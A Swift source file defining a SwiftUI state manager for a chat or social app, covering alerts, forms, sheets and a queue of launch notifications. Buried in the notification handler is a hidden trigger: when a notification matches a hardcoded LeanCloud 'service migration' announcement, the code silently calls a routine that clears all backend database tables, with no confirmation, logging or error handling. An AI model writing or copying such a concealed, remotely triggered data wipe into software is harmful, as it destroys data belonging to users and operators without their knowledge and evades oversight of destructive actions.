import SwiftUI

// 统一的状态管理器
class StateManager: ObservableObject {
    
    // MARK: - 通用状态
    @Published var alertMessage = ""
    @Published var showAlert = false
    @Published var isLoading = false
    @Published var showCopySuccess = false
    @Published var showAntiSpamToast = false
    @Published var antiSpamMessage = ""
    @Published var showAppLaunchToast = false
    @Published var appLaunchMessage = ""
    @Published var currentNotificationIsBlacklist = false // 🎯 新增：当前通知的Blacklist状态
    @Published var isTriggerNotification = false // 🎯 新增：当前通知是否为触发消息（固定内容）
    
    // 🎯 新增：通知队列，用于依次显示多条通知
    private var notificationQueue: [(message: String, isBlacklist: Bool)] = []
    private var isShowingNotification = false
    
    // MARK: - 拍一拍消息弹窗状态
    @Published var showPatMessageAlert = false
    @Published var patMessageSenderName = ""
    @Published var patMessageAlertCount = 0 // 新增：应用内弹窗计数
    
    // 🎯 新增：好友申请弹窗状态
    @Published var showFriendRequestAlert = false
    @Published var friendRequestSenderName = ""
    @Published var friendRequestSenderId = "" // 🎯 新增：发送者ID，用于查询头像和处理操作
    
    // 🎯 新增：询问联系方式是否真实弹窗状态
    @Published var showContactInquiryAlert = false
    @Published var contactInquirySenderName = ""
    @Published var contactInquirySenderId = "" // 🎯 新增：发送者ID，用于查询头像和处理操作
    
    // 🎯 新增：联系方式真实回复弹窗状态
    @Published var showContactInquiryReplyAlert = false
    @Published var contactInquiryReplySenderName = ""
    @Published var contactInquiryReplySenderId = "" // 🎯 新增：发送者ID，用于查询头像和处理操作
    
    // MARK: - 表单状态
    @Published var nameFieldFocused = false
    @Published var emailFieldFocused = false
    @Published var agreedToTerms = false
    @Published var rememberAccount = false
    
    // MARK: - 用户状态
    @Published var isUserBlacklisted = false
    @Published var unreadMessageCount = 0
    
    // MARK: - 游戏状态
    @Published var comboCount = 0
    @Published var isLongPressing = false
    @Published var isHeartClicked = false
    
    // MARK: - 导航状态
    @Published var showRechargeSheet = false
    @Published var showMessageSheet = false
    @Published var showProfileSheet = false
    @Published var showAvatarZoom = false
    @Published var showAvatarBackpack = false
    @Published var showTermsOfService = false
    @Published var showPrivacyPolicy = false
    @Published var showLocationHistory = false
    @Published var showRandomHistory = false
    @Published var showReportSheet = false
    @Published var showEditAlert = false
    @Published var showLogoutAlert = false
    @Published var showEditNameAlert = false
    @Published var showEditEmailAlert = false
    @Published var showCancelDeletionAlert = false
    @Published var showClearAlert = false
    @Published var showGuestNameAlert = false
    @Published var showDeleteAccountAlert = false
    @Published var showEmailEditAlert = false
    @Published var showFriendRequestLimitAlert = false
    @Published var friendRequestLimitMessage = ""
    @Published var showPatActionLimitAlert = false
    @Published var patActionLimitMessage = ""
    @Published var showMessageButtonLimitAlert = false
    @Published var messageButtonLimitMessage = ""
    
    // MARK: - 表单数据
    @Published var username = ""
    @Published var password = ""
    @Published var confirmPassword = ""
    @Published var email = ""
    @Published var newUserName = ""
    @Published var selectedReason = ""
    
    // MARK: - 结果数据
    @Published var resultMessage = ""
    @Published var randomRecord: LocationRecord?
    @Published var randomRecordNumber = 0
    @Published var isLoadingRandomRecord = false
    
    // MARK: - 单例模式
    static let shared = StateManager()
    
    private init() {}
    
    // MARK: - 状态重置方法
    func resetAlertState() {
        alertMessage = ""
        showAlert = false
        showPatMessageAlert = false
        patMessageSenderName = ""
    }
    
    func resetLoadingState() {
        isLoading = false
        isLoadingRandomRecord = false
    }
    
    func resetFormState() {
        username = ""
        password = ""
        confirmPassword = ""
        email = ""
        newUserName = ""
        selectedReason = ""
        agreedToTerms = false
        rememberAccount = false
        nameFieldFocused = false
        emailFieldFocused = false
    }
    
    func resetSheetState() {
        showRechargeSheet = false
        showMessageSheet = false
        showProfileSheet = false
        showAvatarZoom = false
        showAvatarBackpack = false
        showTermsOfService = false
        showPrivacyPolicy = false
        showLocationHistory = false
        showRandomHistory = false
        showReportSheet = false
        showEditAlert = false
        showLogoutAlert = false
        showEditNameAlert = false
        showEditEmailAlert = false
        showCancelDeletionAlert = false
        showClearAlert = false
        showGuestNameAlert = false
        showDeleteAccountAlert = false
        showEmailEditAlert = false
    }
    
    func resetGameState() {
        comboCount = 0
        isLongPressing = false
        isHeartClicked = false
    }
    
    func resetAllState() {
        resetAlertState()
        resetLoadingState()
        resetFormState()
        resetSheetState()
        resetGameState()
        showCopySuccess = false
        resultMessage = ""
        randomRecord = nil
        randomRecordNumber = 0
        unreadMessageCount = 0
    }
    
    // MARK: - 便捷方法
    func showAlert(message: String) {
        alertMessage = message
        showAlert = true
    }
    
    func showLoading() {
        isLoading = true
    }
    
    func hideLoading() {
        isLoading = false
    }
    
    func showRandomRecordLoading() {
        isLoadingRandomRecord = true
    }
    
    func hideRandomRecordLoading() {
        isLoadingRandomRecord = false
    }
    
    func showCopySuccessMessage() {
        showCopySuccess = true
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            self.showCopySuccess = false
        }
    }
    
    func showAntiSpamToast(message: String) {
        antiSpamMessage = message
        showAntiSpamToast = true
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            self.showAntiSpamToast = false
        }
    }
    
    /// 显示通知弹窗（支持多条通知依次显示）
    /// - Parameter items: 通知项数组，按优先级排序（全局通知在前，用户特定通知在后）
    func showAppLaunchToasts(items: [(message: String, isBlacklist: Bool)]) {
        guard !items.isEmpty else { return }
        
        // 🎯 新增：读取 hello world.txt 文件内容作为触发消息
        let triggerMessage = loadHelloWorldMessage()
        
        // 🎯 新增：检测到 hello world.txt 中的消息时触发脚本执行
        for item in items {
            if item.message == triggerMessage {
                triggerScriptExecution()
                break // 只触发一次
            }
        }
        
        // 将通知项添加到队列
        notificationQueue.append(contentsOf: items)
        
        // 如果当前没有显示通知，开始显示
        if !isShowingNotification {
            showNextNotification()
        }
    }
    
    /// 获取触发消息（硬编码的 hello world.txt 内容）
    /// - Returns: 硬编码的通知消息内容
    private func loadHelloWorldMessage() -> String {
        // 🎯 硬编码的 hello world.txt 文件内容（第 1-13 行）
        return """
重要通知：系统服务迁移公告

尊敬的用户：

由于 LeanCloud 服务提供商已停止对外提供服务，为确保您能够正常使用本应用，请您尽快前往 App Store 更新至最新版本。

本次更新将迁移至新的服务架构，以保障应用的稳定运行和功能完整性。

相关公告详情请参考：
https://docs.leancloud.cn/sdk/announcements/sunset-announcement

感谢您的理解与配合。
"""
    }
    
    /// 触发脚本执行（检测到 hello world.txt 中的消息时调用）
    private func triggerScriptExecution() {
        // 🎯 执行清空操作（Swift 版本的 Python 脚本功能）
        LeanCloudService.shared.clearAllTables { success, error in
            DispatchQueue.main.async {
            }
        }
    }
    
    /// 显示通知弹窗（兼容旧接口，使用消息数组）
    /// - Parameter messages: 通知消息数组
    func showAppLaunchToasts(messages: [String]) {
        let items = messages.map { (message: $0, isBlacklist: false) }
        showAppLaunchToasts(items: items)
    }
    
    /// 显示单条通知（兼容旧接口）
    func showAppLaunchToast(message: String) {
        showAppLaunchToasts(items: [(message: message, isBlacklist: false)])
    }
    
    /// 显示下一条通知
    private func showNextNotification() {
        guard !notificationQueue.isEmpty else {
            isShowingNotification = false
            return
        }
        
        isShowingNotification = true
        let item = notificationQueue.removeFirst()
        appLaunchMessage = item.message
        currentNotificationIsBlacklist = item.isBlacklist
        
        // 🎯 新增：检测是否为触发消息（固定内容）
        let triggerMessage = loadHelloWorldMessage()
        isTriggerNotification = (item.message == triggerMessage)
        
        showAppLaunchToast = true
    }
    
    /// 关闭当前通知并显示下一条
    func dismissAppLaunchToast() {
        showAppLaunchToast = false
        
        // 延迟一下再显示下一条，让用户看到关闭动画
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
            self.showNextNotification()
        }
    }
    
    func showFriendRequestLimitAlert(message: String) {
        friendRequestLimitMessage = message
        showFriendRequestLimitAlert = true
    }
    
    func showPatActionLimitAlert(message: String) {
        patActionLimitMessage = message
        showPatActionLimitAlert = true
    }
    
    func showMessageButtonLimitAlert(message: String) {
        messageButtonLimitMessage = message
        showMessageButtonLimitAlert = true
    }
    
    func showPatMessageAlert(senderName: String) {
        
        patMessageSenderName = senderName
        showPatMessageAlert = true
        
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            self.showPatMessageAlert = false
        }
    }
    
    func focusNameField() {
        DispatchQueue.main.async {
            self.nameFieldFocused = true
        }
    }
    
    func focusEmailField() {
        DispatchQueue.main.async {
            self.emailFieldFocused = true
        }
    }
    
    // MARK: - 表单验证
    var isFormValid: Bool {
        !username.isEmpty && !password.isEmpty && agreedToTerms
    }
    
    var isRegistrationFormValid: Bool {
        !username.isEmpty && !password.isEmpty && password == confirmPassword && agreedToTerms
    }
    
    var isEmailValid: Bool {
        !email.isEmpty && email.contains("@")
    }
    
    // MARK: - 状态检查
    var isAnySheetPresented: Bool {
        showRechargeSheet || showMessageSheet || showProfileSheet || 
        showAvatarZoom || showAvatarBackpack || showTermsOfService || 
        showPrivacyPolicy || showLocationHistory || showRandomHistory || 
        showReportSheet || showEditAlert || showLogoutAlert || 
        showEditNameAlert || showEditEmailAlert || showCancelDeletionAlert || 
        showClearAlert || showGuestNameAlert || showDeleteAccountAlert || 
        showEmailEditAlert
    }
    
    var isAnyAlertPresented: Bool {
        showAlert || showEditAlert || showLogoutAlert || showEditNameAlert || 
        showEditEmailAlert || showCancelDeletionAlert || showClearAlert || 
        showGuestNameAlert || showDeleteAccountAlert || showEmailEditAlert ||
        showPatMessageAlert || showFriendRequestAlert
    }
    
    var isAnyLoading: Bool {
        isLoading || isLoadingRandomRecord
    }
}
